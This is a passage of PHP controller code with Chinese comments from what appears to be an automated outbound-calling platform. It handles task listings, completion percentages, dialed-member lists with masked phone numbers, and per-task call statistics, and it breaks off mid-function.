return $this->fetch('indexV_new');
break;
}
}
public function get_task_list(){
// 用户验证
$user_auth = session('user_auth');
if(empty($user_auth) ||empty($user_auth['uid'])){
return returnAjax(2,'error','未登陆');
}
    // 获取输入参数
$task_state = input('task_state','','trim,strip_tags');
$task_name = input('task_name','','trim,strip_tags');
$currentPage = input('currentPage','','trim,strip_tags');
if(empty($currentPage)){
$currentPage = 1;
}
 // 设置分页参数
$page_size = 10;
  // 构建查询
$list = Db::name('tel_config')
->where('member_id',$user_auth['uid'])
->where('type',0);
$where = [];
$where['member_id'] = ['eq',$user_auth['uid']];
$where['type'] = ['eq',0];
if($task_state == -9){
$list = $list->where('status','>',-1);
$where['status'] = ['>',-1 ];
}else{
if(!empty($task_state)){
$list = $list->where('status',$task_state);
$where['status'] = ['eq',$task_state];
}
}
if(!empty($task_name)){
$list = $list->where('task_name','like','%'.$task_name.'%');
$where['task_name'] = ['like','%'.$task_name.'%'];
}
 // 计算总任务数
$count_list = DB::name('tel_config')->where($where)->count();
$list = $list->order('id desc')
->page($currentPage,$page_size)
->select();
$task_ids = [];
   // 获取任务列表
foreach ($list as $key =>$value) {
     // 获取场景名称
$scenarios = Db::name('tel_scenarios')->where("id",$value['scenarios_id'])->value('name');
$list[$key]['scenarios'] = $scenarios;
       // 格式化创建时间
$list[$key]['create_datetime']= date('Y-m-d H:i:s',$value['create_time']);
    // 设置任务状态名称
if($value['status'] === 0){
$list[$key]['status_name'] = '待启动';
}else if($value['status'] === 1){
if($list[$key]['is_again_call'] == 1 &&$list[$key]['already_again_call_count'] >0){
$list[$key]['status_name'] = '重呼第'.$list[$key]['already_again_call_count'] .'次';
}else{
$list[$key]['status_name'] = '进行中';
}
}else if($value['status'] === 2){
$list[$key]['status_name'] = '人工暂停';
}else if($value['status'] === 5){
$list[$key]['status_name'] = '定时暂停';
}else if($value['status'] === 6){
$list[$key]['status_name'] = '异常暂停';
}else if($value['status'] === 4){
$list[$key]['status_name'] = '欠费暂停';
$list[$key]['arrears_user']=$value['arrears_user'];
}else if($value['status'] === 3){
$list[$key]['status_name'] = '已完成';
}else if($value['status'] === -1){
$list[$key]['status_name'] = '已删除';
}else if($value['status'] === 7){
$list[$key]['status_name'] = '任务故障';
}else{
$list[$key]['status_name'] = '未知状态';
}
 // 设置欠费用户信息（如果有）
if(!isset( $list[$key]['arrears_user'] )) $list[$key]['arrears_user']='';
$task_ids[] = $value['task_id'];
}
    // 计算任务完成情况
if($task_ids){
$cwhere = $all_count = $all_count_ = $here = $all_molecular = $all_molecular_ = array();
$cwhere["status"] = ['>=',0];
$cwhere['task'] = ['in',$task_ids];
$all_count = Db::name('member')->group('task')->where($cwhere)->field('task,count(1) as counts')->select();
if($all_count){
foreach($all_count as  $key =>$val){
$all_count_[$val['task']] = $val;
}
}
$here['task'] = ['in',$task_ids];
$here["status"] = ['>',1];
$all_molecular  = Db::name('member')->group('task')->where($here)->field('task,count(1) as counts')->select();
if($all_molecular){
foreach($all_molecular as  $key =>$val){
$all_molecular_[$val['task']] = $val;
}
}
foreach ($list as $key =>$val) {
$list[$key]['Molecular'] = $all_molecular_[$val['task_id']]['counts'] ??0;
$list[$key]['denominator'] = $all_count_[$val['task_id']]['counts'] ??0;
if (empty($list[$key]['Molecular']) ||empty($list[$key]['denominator'])) {
$list[$key]['percent_complete'] = 0;
}else {
$list[$key]['percent_complete'] = round($list[$key]['Molecular'] / $list[$key]['denominator'] * 100,2);
}
}
}
   // 计算分页信息
$pageCount = ceil($count_list / $page_size);
 // 准备返回数据
$data['list'] = $list;
$data['pageNo'] = $page_size ;
$data['pageCount'] = $pageCount;
$data['count'] = $count_list;
return returnAjax(0,'获取数据成功',$data);
}
public function get_task_list_api_one(){
    // 获取用户认证信息
    $user_auth = session('user_auth');
    // 检查用户是否登录
    if(empty($user_auth) || empty($user_auth['uid'])){
        return returnAjax(2,'error','未登陆');
    }

    // 获取POST请求中的task_id
    $task_id = input('post.task_id','','trim,strip_tags');
    // 检查task_id是否为空
    if(empty($task_id)){
        return returnAjax(1,'task_id不能为空','未登陆');
    }

    // 设置查询条件
    $where = array();
    $where['member_id'] = $user_auth['uid'];
    $where['type'] = 0;
    $where['task_id'] = $task_id;

    // 根据条件查询任务信息
    $list = Db::name('tel_config')
        ->where($where)
        ->order('id desc')
        ->find();

    // 如果找到了任务信息
    if (!empty($list)) {
        // 获取与任务相关的场景信息
        $tel_scenarios = Db::name('tel_scenarios')->where(['id'=>$list['scenarios_id']])->find();
        // 设置查询条件
        $where_tc['scenarios_id'] = $tel_scenarios['id'];
        $where_tc['is_variable'] = 0;
        $where_tc['content'] = [['neq','null'],['neq',''],['exp','is not null'],'and'];
        // 计算固定语料数量
        $count_guding = Db::name('tel_corpus')->where($where_tc)->count('*');
        // 计算未更改的电话数量
        $all_num_phone = Db::name('member')->where(['task'=>$task_id,'is_change'=>0])->count('*');
        // 计算变量语料数量
        $corpus_var_num = Db::name('tel_corpus')->where(['scenarios_id'=>$tel_scenarios['id'],'is_variable'=>1])->count('*');
        // 计算总数
        $all_num = $all_num_phone * $corpus_var_num + $count_guding;
        // 计算已更改的数量
        $is_change_num = Db::name('tel_var_audio_info')->where(['task_id'=>$task_id,'scenarios_id'=>$tel_scenarios['id']])->count('*');

        // 如果场景是变量类型
        if($tel_scenarios['is_variable'] == 1){
            $redis = RedisConnect::get_redis_connect();
            $key_list = 'create_luyin_task_id';
            $key = 'luyin_is_finish_'.$task_id;
            $yuji_time = $all_num * 2;
            $arr = $redis->lrange($key_list, 0, -1);
            // 检查任务是否在队列中
            if(in_array($task_id, $arr)){
                $result['yuji_time'] = "您的任务正在队列中,请您耐心等待";
            } else {
                // 计算预计时间
                if($yuji_time < 60){
                    $result['yuji_time'] = $yuji_time.'秒';
                } else {
                    $result['yuji_time'] = ceil($yuji_time / 60).'分';
                }
            }
            // 检查Redis中任务完成状态
            if(!empty($redis->get($key))){
                $list['all_num_phone'] = $all_num_phone;
                $list['is_redis'] = 1;
                $list['is_change'] = 1;
                $list['is_change_num'] = $is_change_num;
                $list['all_num'] = $all_num;
            } else {
                $list['all_num_phone'] = $all_num_phone;
                $list['is_redis'] = 0;
                // 检查是否有更改
                if($all_num != $is_change_num && !empty($all_num_phone)){
                    $list['is_change'] = 1;
                    $list['is_change_num'] = $is_change_num;
                    $list['all_num'] = $all_num;
                } else {
                    $list['is_change'] = 0;
                    $list['is_change_num'] = $is_change_num;
                    $list['all_num'] = $all_num;
                }
            }
        } else {
            // 如果场景不是变量类型
            $list['all_num_phone'] = $all_num_phone;
            $list['is_change'] = 0;
            $list['is_change_num'] = 0;
            $list['all_num'] = 0;
            $list['is_redis'] = 0;
        }

        // 获取场景名称
        $scenarios = Db::name('tel_scenarios')->where("id", $list['scenarios_id'])->value('name');
        $list['scenarios'] = $scenarios;
        // 格式化创建时间
        $list['create_datetime'] = date('Y-m-d H:i:s', $list['create_time']);

        // 设置呼叫类型名称
        if($list['call_type'] === 0){
            $list['call_type_name'] = '语音网关';
        } else {
            $list['call_type_name'] = '中继线路';
        }

        // 设置任务状态名称
        if($list['status'] === 0){
            $list['status_name'] = '待启动';
        } else if($list['status'] === 1){
            if($list['is_again_call'] == 1 && $list['already_again_call_count'] > 0){
                $list['status_name'] = '重呼第'.$list['already_again_call_count'].'次';
            } else {
                $list['status_name'] = '进行中';
            }
        } else if($list['status'] === 2){
            $list['status_name'] = '人工暂停';
        } else if($list['status'] === 3){
            $list['status_name'] = '已完成';
        } else if($list['status'] === 4){
            $list['status_name'] = '欠费暂停';
            $list['arrears_user'] = $list['arrears_user'];
        } else if($list['status'] === 5){
            $list['status_name'] = '定时暂停';
        } else if($list['status'] === 6){
            $list['status_name'] = '异常暂停';
        } else if($list['status'] === -1){
            $list['status_name'] = '删除';
        } else if($list['status'] === 7){
            $list['status_name'] = '任务故障';
        } else {
            $list['status_name'] = '未知状态';
        }

        // 设置欠费用户信息
        if(!isset($list['arrears_user'])) $list['arrears_user'] = '';

        // 设置完成度计算条件
        $cwhere = array();
        if($list['task_id']){
            $cwhere["task"] = $list['task_id'];
        }
        $cwhere["status"] = ['>=', 0];
        // 计算分子
        $count = Db::connect(config('master_db'))->table('rk_member')->where($cwhere)->count(1);
        $here = array();
        if($list['task_id']){
            $here["task"] = $list['task_id'];
        }
        $here["status"] = ['>', 1];
        // 计算分母
        $Molecular = Db::connect(config('master_db'))->table('rk_member')->where($here)->count(1);
        // 计算完成百分比
        if($count > 0 && $Molecular > 0){
            $percent = round(($Molecular / $count) * 100, 2);
        } else {
            $percent = 0;
        }
        $list['Molecular'] = $Molecular;
        $list['denominator'] = $count;
        if(empty($list['Molecular']) || empty($list['denominator'])){
            $list['percent_complete'] = 0;
        } else {
            $list['percent_complete'] = round($list['Molecular'] / $list['denominator'] * 100, 2);
        }
        $list['percent'] = $percent;
    } else {
        // 如果任务不存在
        return returnAjax(1,'该任务不存在');
    }

    // 返回任务信息
    return returnAjax(0,'success',$list);
}

public function get_task_list_api(){
    // 获取用户认证信息
    $user_auth = session('user_auth');
    // 检查用户是否登录
    if(empty($user_auth) || empty($user_auth['uid'])){
        return returnAjax(2,'error','未登陆');
    }

    // 获取POST请求中的参数
    $task_state = input('post.task_state','','trim,strip_tags');
    $task_name =  input('post.task_name','','trim,strip_tags');
    $currentPage = input('currentPage','','trim,strip_tags');
    $act = input('act','','trim,strip_tags');
    $page_size = 10; // 设置每页显示的任务数量

    // 设置查询条件
    $where = array();
    $where['member_id'] = $user_auth['uid'];
    $where['type'] = 0;
    if($task_state != ''){
        $where['status'] = $task_state;
    } else {
        $where['status'] = ['>=', 0];
    }
    if(!empty($task_name)){
        $where['task_name'] = ['like', '%'.$task_name.'%'];
    }

    // 根据条件查询任务列表并进行分页
    $list = Db::name('tel_config')
        ->where($where)
        ->order('id desc')
        ->page($currentPage, $page_size)
        ->select();

    // 遍历任务列表，添加额外的信息
    foreach ($list as $key => $value) {
        // 获取场景名称
        $scenarios = Db::name('tel_scenarios')->where("id", $value['scenarios_id'])->value('name');
        $list[$key]['scenarios'] = $scenarios;
        $list[$key]['create_datetime'] = date('Y-m-d H:i:s', $value['create_time']);

        // 设置呼叫类型名称
        if($value['call_type'] === 0){
            $list[$key]['call_type_name'] = '语音网关';
        } else {
            $list[$key]['call_type_name'] = '中继线路';
        }
   // 设置任务状态名称
if($value['status'] === 0){
$list[$key]['status_name'] = '待启动';
}else if($value['status'] === 1){
if($value['is_again_call'] == 1 &&$value['already_again_call_count'] >0){
$list[$key]['status_name'] = '重呼第'.$value['already_again_call_count'] .'次';
}else{
$list[$key]['status_name'] = '进行中';
}
}else if($value['status'] === 2){
$list[$key]['status_name'] = '人工暂停';
}else if($value['status'] === 3){
$list[$key]['status_name'] = '已完成';
}else if($value['status'] === 4){
$list[$key]['status_name'] = '欠费暂停';
$value['arrears_user']=  $value['arrears_user'];
}else if($value['status'] === 5){
$list[$key]['status_name'] = '定时暂停';
}else if($value['status'] === 6){
$list[$key]['status_name'] = '异常暂停';
}else if($value['status'] === -1){
$list[$key]['status_name'] = '删除';
}else if($value['status'] === 7){
$list[$key]['status_name'] = '任务故障';
}else{
$list[$key]['status_name'] = '未知状态';
}
  // 设置欠费用户信息
        if(!isset($value['arrears_user'])) $value['arrears_user'] = '';

        // 计算任务完成度
        $cwhere = array();
        if($value['task_id']){
            $cwhere["task"] = $value['task_id'];
        }
        $cwhere["status"] = ['>=', 0];
        $count = Db::name('member')->where($cwhere)->count(1);
        $here = array();
        if($value['task_id']){
            $here["task"] = $value['task_id'];
        }
        $here["status"] = ['>', 1];
        $Molecular = Db::name('member')->where($here)->count(1);
        if($count > 0 && $Molecular > 0){
            $percent = round(($Molecular / $count) * 100, 2);
        } else {
            $percent = 0;
        }
        $list[$key]['Molecular'] = $Molecular;
        $list[$key]['denominator'] = $count;
        if(empty($list[$key]['Molecular']) || empty($list[$key]['denominator'])){
            $list[$key]['percent_complete'] = 0;
        } else {
            $list[$key]['percent_complete'] = round($list[$key]['Molecular'] / $list[$key]['denominator'] * 100, 2);
        }
        $list[$key]['percent'] = $percent;
    }

    // 计算总页数
    $count = Db::name('tel_config')->where($where)->count();
    $pageCount = ceil($count / $page_size);

    // 准备返回的数据
    $data['list'] = $list;
    $data['pageNo'] = $page_size;
    $data['pageCount'] = $pageCount;
    $data['count'] = $count;

    // 返回数据
    return returnAjax(0, '获取数据成功', $data);
}
public function alreadyDialed3(){
    $Page_size = 10;
    $page = input('page', '1', 'trim,strip_tags');
    $taskId = input('taskId', '', 'trim,strip_tags');
    $user_auth = session('user_auth');
    $uid = $user_auth["uid"];
    $super = $user_auth["super"];
    $where = array();

    if (!empty($taskId)) {
        // 如果传入了任务ID，则设置任务筛选条件
        $where['task'] = $taskId;
    }

    // 设置状态筛选条件为1，表示已拨打
    $where["status"] = 1;

    // 查询符合筛选条件的会员列表
    $list = Db::name('member')
        ->field('uid, mobile, nickname, real_name, status, duration, last_dial_time, originating_call, level')
        ->where($where)
        ->order('uid desc')
        ->page($page, $Page_size)
        ->select();

    // 遍历查询结果，处理 last_dial_time 和 mobile 字段
    foreach ($list as &$item) {
        if ($item['last_dial_time'] > 0) {
            // 将 last_dial_time 转换为格式化的日期时间
            $item['last_dial_time'] = date('Y-m-d H:i:s', $item['last_dial_time']);
        } else {
            // 如果 last_dial_time 为0，则设置为0
            $item['last_dial_time'] = 0;
        }
        // 隐藏手机号中间部分，保护隐私
        $item['mobile'] = hide_phone_middle($item['mobile']);
    }

    // 统计符合筛选条件的记录总数
    $count =  Db::name('member')->where($where)->count(1);

    // 计算总页数
    $page_count = ceil($count / $Page_size);

    // 构建返回数据数组
    $back = array();
    $back['total'] = $count;  // 总记录数
    $back['Nowpage'] = $page;  // 当前页数
    $back['list'] = $list;  // 当前页的数据列表
    $back['page'] = $page_count;  // 总页数

    // 返回格式化的响应数据
    return returnAjax(0, '获取数据成功', $back);
}

public function alreadyDialed(){
$Page_size = 10;
$page = input('page','1','trim,strip_tags');
$user_auth = session('user_auth');
$uid = $user_auth["uid"];
$super = $user_auth["super"];
$where = array();
$where["task"] = input('taskId','','trim,strip_tags');
$where["status"] = [">=",2];
$list = Db::name('member')
->field('uid,mobile,nickname,real_name,status,duration,last_dial_time,originating_call,level')
->where($where)
->order('uid desc')
->page($page,$Page_size)
->select();
foreach($list as &$item){
if ($item['last_dial_time'] >0){
$item['last_dial_time'] = date('Y-m-d H:i:s',$item['last_dial_time']);
}
else{
$item['last_dial_time'] = 0;
}
$item['mobile']=hide_phone_middle($item['mobile']);
}
$count =  Db::name('member')->where($where)->count(1);
$page_count = ceil($count/$Page_size);
$back = array();
$back['total'] = $count;
$back['Nowpage'] = $page;
$back['list'] = $list;
$back['page'] = $page_count;
return returnAjax(0,'获取数据成功',$back);
}
public function alreadyDialed2() {
    // 每页显示的记录数
    $Page_size = 10;
    // 获取当前页数，默认为1
    $page = input('page', '1', 'trim,strip_tags');
    // 获取用户认证信息
    $user_auth = session('user_auth');
    $uid = $user_auth["uid"];
    $super = $user_auth["super"];
    $where = array();

    // 获取任务ID
    $where["task"] = input('taskId', '', 'trim,strip_tags');
    $n_liststate = input('n_liststate', '', 'trim,strip_tags');
    $Lengthoftime = input('Lengthoftime', '', 'trim,strip_tags');
    $rotation = input('rotation', '', 'trim,strip_tags');
    $activeMode = input('activeMode', '', 'trim,strip_tags');
    $Levelofintention = input('Levelofintention', '', 'trim,strip_tags');

    // 根据不同情况设置会员状态筛选条件
    if ($n_liststate == 0) {
        if (!empty($activeMode)) {
            $where['status'] = $activeMode;
        } else {
            $where['status'] = ["=", 2];
        }
    } elseif ($n_liststate == 1) {
        $where['status'] = 1;
    } elseif ($n_liststate == 2) {
        if (!empty($activeMode)) {
            $where['status'] = $activeMode;
        } else {
            $where['status'] = ["in", [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]];
        }
    }

    // 根据通话时长筛选条件设置会员通话时长范围
    if (!empty($Lengthoftime)) {
        switch ($Lengthoftime) {
            case 1:
                $where['duration'] = [[">=", 1], ["<=", 9]];
                break;
            case 2:
                $where['duration'] = [[">=", 10], ["<=", 17]];
                break;
            case 3:
                $where['duration'] = [[">=", 18], ["<=", 39]];
                break;
            case 4:
                $where['duration'] = [">", 40];
                break;
        }
    }

    // 根据通话次数筛选条件设置会员通话次数范围
    if (!empty($rotation)) {
        switch ($rotation) {
            case 1:
                $where['call_times'] = [[">=", 1], ["<=", 2]];
                break;
            case 2:
                $where['call_times'] = [[">=", 3], ["<=", 4]];
                break;
            case 3:
                $where['call_times'] = [[">=", 5], ["<=", 6]];
                break;
            case 4:
                $where['call_times'] = [[">=", 7], ["<=", 10]];
                break;
            case 5:
                $where['call_times'] = [">", 10];
                break;
        }
    }
if ($Levelofintention) {
    // 如果存在意向级别筛选条件，则设置筛选条件
    $where['level'] = $Levelofintention;
}

// 查询符合筛选条件的会员列表
$list = Db::name('member')
    ->field('uid, mobile, nickname, real_name, status, duration, last_dial_time, originating_call, level, call_times')
    ->where($where)
    ->page($page, $Page_size)
    ->order('uid asc')
    ->select();

// 遍历查询结果，处理 last_dial_time 和 mobile 字段
foreach ($list as &$item) {
    if ($item['last_dial_time'] > 0) {
        // 将 last_dial_time 转换为格式化的日期时间
        $item['last_dial_time'] = date('Y-m-d H:i:s', $item['last_dial_time']);
    } else {
        // 如果 last_dial_time 为0，则设置为0
        $item['last_dial_time'] = 0;
    }
    // 隐藏手机号中间部分，保护隐私
    $item['mobile'] = hide_phone_middle($item['mobile']);
}

// 统计符合筛选条件的记录总数
$count = Db::name('member')->where($where)->count(1);

// 计算总页数
$page_count = ceil($count / $Page_size);

// 构建返回数据数组
$back = array();
$back['total'] = $count;  // 总记录数
$back['Nowpage'] = $page;  // 当前页数
$back['list'] = $list;  // 当前页的数据列表
$back['page'] = $page_count;  // 总页数

// 返回格式化的响应数据
return returnAjax(0, '获取数据成功', $back);

}
public function get_task_data_api()
{
    // 检查是否是POST请求
    if(IS_POST){
        // 获取并清理task_id参数
        $task_id = input('task_id','','trim,strip_tags');
        // 如果task_id为空，则返回错误信息
        if(empty($task_id)){
            return returnAjax(2,'error','参数错误');
        }

        // 从数据库中获取任务配置数据
        $conf_data = Db::name('tel_config')
            ->field('task_id,task_name,member_id,call_type,scenarios_id,robot_cnt,create_time,status,is_add_crm,remarks,call_phone_id,wx_push_status,send_sms_status,arrears_user, is_again_call, again_call_status, again_call_count, already_again_call_count,asr_id,is_auto,call_phone_group_id')
            ->where('task_id',$task_id)
            ->find();

        // 如果任务状态是已完成，获取任务统计数据
        if($conf_data['status'] == 3){
            $statistics_task = Db::name('task_statistics')->where(['task_id'=>$conf_data['task_id']])->find();
            if($statistics_task){
                return $this->get_task_statistics($conf_data,$statistics_task);
            }
        }

        // 设置日期和条件查询
        $date = strtotime(date('Y-m-d'));
        $where = [];
        $where['task_id'] = ['=',$task_id];
        $where['create_time'] = ['<',$date];
        $where['status'] = ['not in',[3,-1]];
        $whereOr1['task_id'] =  ['=',$task_id];
        $whereOr1['update_time'] = ['>=',$date];
        $whereOr1['status'] = ['neq',-1];
        $whereOr['status']=['not in',[3,-1]];
        $whereOr['task_id'] = ['=',$task_id];

        // 查询任务是否存在
        $whether = Db::name('tel_config')
            ->where(function ($query) use($where) {
                $query->where($where);
            })->whereOr(function ($query) use($whereOr1){
                $query->where($whereOr1);
            })
            ->count(1);

        // 根据任务是否存在，设置不同的URL
        if($whether >0){
            $conf_data['url'] = url('user/callrecord/current_record') .'?task_id='.$task_id;
        }else{
            $conf_data['url'] = url('user/callrecord/historical_records') .'?task_id='.$task_id;
        }

        // 设置呼叫类型
        if($conf_data['call_type'] == 1){
            $conf_data['call_type'] = '中继线路';
        }else{
            $conf_data['call_type'] = '语音网关';
        }

        // 获取线路名称
        $conf_data['line_name'] = Db::name('tel_line_group')
            ->where('id',$conf_data['call_phone_group_id'])
            ->value('name');
        if(empty($conf_data['line_name'])){
            $conf_data['line_name']='未分配';
        }

        // 获取备用线路名称
        $conf_data['line_name_'] = Db::name('tel_line')
            ->where('id',$conf_data['call_phone_id'])
            ->value('name');
        if(empty($conf_data['line_name_'])){
            $conf_data['line_name_']='未分配';
        }

        // 根据任务状态设置任务状态描述
        if($conf_data['status'] === 0){
            $conf_data['task_status'] = '待启动';
        } else if($conf_data['status'] === 1){
            if($conf_data['is_again_call'] == 1 && $conf_data['already_again_call_count'] > 0){
                $conf_data['task_status'] = '重呼第'.$conf_data['already_again_call_count'] .'次';
            } else {
                $conf_data['task_status'] = '进行中';
            }
        } else if($conf_data['status'] === 2){
            $conf_data['task_status'] = '人工暂停';
        } else if($conf_data['status'] === 3){
            $conf_data['task_status'] = '已完成';
        } else if($conf_data['status'] === 4){
            $conf_data['task_status'] = '欠费暂停';
            $conf_data['arrears_user'] = $conf_data['arrears_user'];
        } else if($conf_data['status'] === 5){
            $conf_data['task_status'] = '定时暂停';
        } else if($conf_data['status'] === 6){
            $conf_data['task_status'] = '异常暂停';
        } else if($conf_data['status'] === -1){
            $conf_data['task_status'] = '已删除';
        } else if($conf_data['status'] === 7){
            $conf_data['task_status'] = '任务故障';
        } else {
            $conf_data['task_status'] = '未知状态';
        }
        if(!isset($conf_data['arrears_user'])) $conf_data['arrears_user'] ='';

        // 继续获取任务相关的其他数据
        $result = $conf_data;
        $result_scenarios = Db::name('tel_scenarios')
            ->field('name,break,is_variable,id')
            ->where('id',$result['scenarios_id'])
            ->find();
        // ...（剩余部分在下一段注释中）

// 设置查询条件，用于获取固定语料的数量
$where_tc['scenarios_id'] = $result_scenarios['id']; // 设置场景ID
$where_tc['is_variable'] = 0; // 设置语料类型为固定（非变量）
// 确保内容不为空，这里使用了多重条件
$where_tc['content'] = [['neq', 'null'], ['neq', ''], ['exp', 'is not null'], 'and'];
// 计算固定语料的数量
$count_guding = Db::name('tel_corpus')->where($where_tc)->count('*');

// 计算未更换电话号码的成员数量
$all_num_phone = Db::name('member')
    ->where(['task' => $task_id, 'is_change' => 0])
    ->count('*');

// 计算变量语料的数量
$corpus_var_num = Db::name('tel_corpus')
    ->where(['scenarios_id' => $result_scenarios['id'], 'is_variable' => 1])
    ->count('*');

// 计算总数，总数 = 未更换电话号码的成员数量 * 变量语料数量 + 固定语料数量
$all_num = $all_num_phone * $corpus_var_num + $count_guding;

// 计算已更换的语音信息数量
$is_change_num = Db::name('tel_var_audio_info')
    ->where(['task_id' => $task_id, 'scenarios_id' => $result_scenarios['id']])
    ->count('*');

// 检查场景是否为变量类型
if($result_scenarios['is_variable'] == 1){
    $redis = RedisConnect::get_redis_connect(); // 获取Redis连接
    $key = 'luyin_is_finish_' . $task_id; // 设置用于检查任务完成状态的Redis键
    $key_list = 'create_luyin_task_id'; // 设置用于存储任务ID的Redis键
    $yuji_time = $all_num * 2; // 估计完成时间，基于总数的两倍
    $arr = $redis->lrange($key_list, 0, -1); // 从Redis获取任务ID列表

    // 检查当前任务ID是否在队列中
    if(in_array($task_id, $arr)){
        $result['yuji_time'] = "您的任务正在队列中,请您耐心等待";
    } else {
        // 根据估计时间设置返回的时间格式
        if($yuji_time < 60){
            $result['yuji_time'] = $yuji_time . '秒';
        } else {
            $result['yuji_time'] = ceil($yuji_time / 60) . '分';
        }
    }

    // 检查Redis中是否有完成标记
    if(!empty($redis->get($key))){
        // 如果有完成标记，设置相关的返回信息
        $result['all_num_phone'] = $all_num_phone;
        $result['is_redis'] = 1;
        $result['is_change'] = 1;
        $result['is_change_num'] = $is_change_num;
        $result['all_num'] = $all_num;
    } else {
        // 如果没有完成标记，设置相关的返回信息
        $result['all_num_phone'] = $all_num_phone;
        $result['is_redis'] = 0;
        if($all_num != $is_change_num && !empty($all_num_phone)){
            $result['is_change'] = 1;
            $result['is_change_num'] = $is_change_num;
            $result['all_num'] = $all_num;
        } else {
            $result['is_change'] = 0;
            $result['is_change_num'] = $is_change_num;
            $result['all_num'] = $all_num;
        }
    }
} else {
    // 如果场景不是变量类型，设置默认返回信息
    $result['all_num_phone'] = $all_num_phone;
    $result['is_change'] = 0;
    $result['is_change_num'] = 0;
    $result['all_num'] = 0;
    $result['is_redis'] = 0;
}

// 从数据库中查询ASR接口的名称
$result_asr = DB::name('tel_interface')->field('name')->where('id', $result['asr_id'])->find();

// 检查是否获取到了ASR接口的名称
if(isset($result_asr['name'])){
    // 如果找到了ASR接口的名称，将其设置到结果数组中
    $result['asr_name'] = $result_asr['name'];
} else {
    // 如果没有找到ASR接口的名称，设置默认消息表示ASR可能已被删除
    $result['asr_name'] = 'ASR已删除';
}

// 检查是否设置了话术名称
if(isset($result_scenarios['name'])){
    // 如果设置了话术名称，则将其赋值给结果数组
    $result['scenarios_name'] = $result_scenarios['name'];
} else {
    // 如果没有设置话术名称，则在结果数组中标记为“话术已删除”
    $result['scenarios_name'] = '话术已删除';
}

// 检查是否设置了话术中断标志
if(isset($result_scenarios['break'])){
    // 如果设置了话术中断标志，则将其赋值给结果数组
    $result['scenarios_break'] = $result_scenarios['break'];
} else {
    // 如果没有设置话术中断标志，则在结果数组中留空
    $result['scenarios_break'] = '';
}

// 根据话术中断标志设置相应的文本描述
if($result['scenarios_break']){
    $result['scenarios_break'] = '否'; // 如果中断标志为真，则表示没有中断
} else {
    $result['scenarios_break'] = '是'; // 如果中断标志为假，则表示有中断
}

// 设置是否自动执行的文本描述
if($result['is_auto']){
    $result['is_auto_txt'] = '是'; // 如果是自动执行，则标记为“是”
} else {
    $result['is_auto_txt'] = '否'; // 如果不是自动执行，则标记为“否”
}

// 设置微信推送状态的文本描述
$result['wx_push_status'] = $result['wx_push_status'] == 1 ? '是' : '否';

// 设置发送短信状态的文本描述
$result['send_sms_status'] = $result['send_sms_status'] == 1 ? '是' : '否';

// 设置是否添加到CRM的文本描述
$result['is_add_crm'] = $result['is_add_crm'] ? '是' : '否';

// 将创建时间格式化为 '年-月-日 时:分' 的格式
$result['create_time'] = date('Y-m-d H:i', $result['create_time']);

// 创建 MemberData 类的实例
$MemberData = new MemberData();

// 获取最后一次拨打时间
$result['last_dial_time'] = $MemberData->get_last_dial_time($task_id);

// 保存最后一次拨打时间的原始值
$lastdialtime = $result['last_dial_time'];

// 检查是否存在最后一次拨打时间
if(!$result['last_dial_time']){
    // 如果没有最后一次拨打时间，则标记为 '未拨打'
    $result['last_dial_time'] = '未拨打';
} else {
    // 如果存在最后一次拨打时间，则将其格式化为 '年-月-日 时:分' 的格式
    $result['last_dial_time'] = date('Y-m-d H:i', $result['last_dial_time']);
}

// 获取并设置任务的相关统计数据
$result['call_count'] = $MemberData->get_call_count($task_id); // 总拨打次数
$result['connect_count'] = $MemberData->get_connect_count($task_id); // 接通次数
$result['not_connect_count'] = $MemberData->get_not_connect_count($task_id); // 未接通次数
$result['wait_count'] = $MemberData->get_wait_count($task_id); // 等待次数
$result['count'] = $MemberData->get_count($task_id); // 总数

if(!empty($result['count'])){
      // 计算连接率
if(empty($result['call_count'])){
$result['connect_rate'] = 0;
}else {
$result['connect_rate'] = round($result['connect_count']/$result['call_count']*100,2);
}
  // 获取并设置不同级别的数据
$result['level_a'] = $MemberData->get_level_count($task_id,6);
$level_a = $result['level_a'];
if(!empty($result['level_a'])){
$result['level_a'] = round($result['level_a']/$result['count']*100,2);
}else{
$result['level_a'] = 0;
}
$result['level_b'] = $MemberData->get_level_count($task_id,5);
$level_b = $result['level_b'];
if(!empty($result['level_b'])){
$result['level_b'] = round($result['level_b']/$result['count']*100,2);
}else{
$result['level_b'] = 0;
}
 // ... 继续设置其他级别的数据
$result['level_c'] = $MemberData->get_level_count($task_id,4);
$level_c = $result['level_c'];
if(!empty($result['level_c'])){
$result['level_c'] = round($result['level_c']/$result['count']*100,2);
}else{
$result['level_c'] = 0;
}
$result['level_d']  = $MemberData->get_level_count($task_id,3);
$level_d = $result['level_d'];
if(!empty($result['level_d'])){
$result['level_d'] = round($result['level_d']/$result['count']*100,2);
}else{
$result['level_d'] = 0;
}
$result['level_e'] = $MemberData->get_level_count($task_id,2);
$level_e = $result['level_e'];
if(!empty($result['level_e'])){
$result['level_e'] = round($result['level_e']/$result['count']*100,2);
}else{
$result['level_e'] = 0;
}
$result['level_f'] = $MemberData->get_level_count($task_id,1);
$level_f = $result['level_f'];
if(!empty($result['level_f'])){
$result['level_f'] = round($result['level_f']/$result['count']*100,2);
}else{
$result['level_f'] = 0;
}
    // 计算级别 A 和级别 B 的比例
$result['level_a_b_rate'] = round($result['level_a'] +$result['level_b'],2);
$intention_rules = Db::name('tel_intention_rule')
->field('level,rule')
->where('scenarios_id',$result['scenarios_id'])
->order('level asc')
->select();
$rules = [];
foreach($intention_rules as $key=>$value){
     // 获取意向规则并设置级别名称
$rules[$value['level']] = unserialize($value['rule']);
}
$result['level_a_name'] = '意向客户';
$result['level_b_name'] = '一般意向';
$result['level_c_name'] = '简单对话';
$result['level_d_name'] = '无有效对话';
$result['level_e_name'] = '有效未接通';
$result['level_f_name'] = '无效号码';
  // 获取通话时长数据
$duration_count = 0;
$result['duration_1'] = $MemberData->get_duration_count($task_id,1);
$duration_1 = $result['duration_1'];
$duration_count += $result['duration_1'];
$result['duration_2'] = $MemberData->get_duration_count($task_id,2);
$duration_2 = $result['duration_2'];
$duration_count += $result['duration_2'];
$result['duration_3'] = $MemberData->get_duration_count($task_id,3);
$duration_3 = $result['duration_3'];
$duration_count += $result['duration_3'];
$result['duration_4'] = $MemberData->get_duration_count($task_id,4);
$duration_4 = $result['duration_4'];
$duration_count += $result['duration_4'];
  // 计算通话时长比例
if(!empty($result['duration_1'])){
$result['duration_1'] = round($result['duration_1']/$duration_count*100,2);
}else{
$result['duration_1'] = 0;
}
if(!empty($result['duration_2'])){
$result['duration_2'] = round($result['duration_2']/$duration_count*100,2);
}else{
